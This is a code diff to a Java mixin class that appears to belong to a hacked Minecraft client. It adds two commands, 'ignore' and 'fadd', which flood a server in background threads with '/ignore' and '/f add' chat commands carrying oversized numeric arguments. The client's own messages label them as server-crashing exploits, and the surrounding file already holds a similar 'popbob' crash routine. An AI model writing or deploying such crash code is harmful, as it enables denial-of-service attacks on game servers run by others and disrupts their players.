@@ -220,7 +220,56 @@ public class ClientPlayerEntityMixin {
 								return;
 							}
 						break;
-
+						case "ignore": // /ignore 55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
+							ChatUtils.message("Crashing - LoverFella (/IGNORE)");
+							if(args.length < 3){
+								ChatUtils.message("Provide a Integer for power");
+								return;
+							}
+							try{
+								int power = Integer.valueOf(args[2]);
+								new Thread(() -> {
+									long syst = System.currentTimeMillis();
+									for(int i = 0; i < power * 10; i++){
+										Delta.c.player.sendChatMessage("/ignore 55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555");
+										try {
+											Thread.sleep(500);
+										} catch (InterruptedException e) {
+											e.printStackTrace();
+										}
+									}
+									ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
+								}).start();
+							}catch(NumberFormatException e){
+								ChatUtils.message("Provide a valid Integer for power");
+								return;
+							}
+						break;
+							case "fadd":
+							ChatUtils.message("Crashing - LoverFella (/F ADD)");
+							if(args.length < 3){
+								ChatUtils.message("Provide a Integer for power");
+								return;
+							}
+							try{
+								int power = Integer.valueOf(args[2]);
+								new Thread(() -> {
+									long syst = System.currentTimeMillis();
+									for(int i = 0; i < power * 10; i++){
+										Delta.c.player.sendChatMessage("/f add 555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555");
+										try {
+											Thread.sleep(500);
+										} catch (InterruptedException e) {
+											e.printStackTrace();
+										}
+									}
+									ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
+								}).start();
+							}catch(NumberFormatException e){
+								ChatUtils.message("Provide a valid Integer for power");
+								return;
+							}
+						break;
 						case "popbob":
 						ChatUtils.message("Crashing - Popbob");
 						if(args.length < 3){
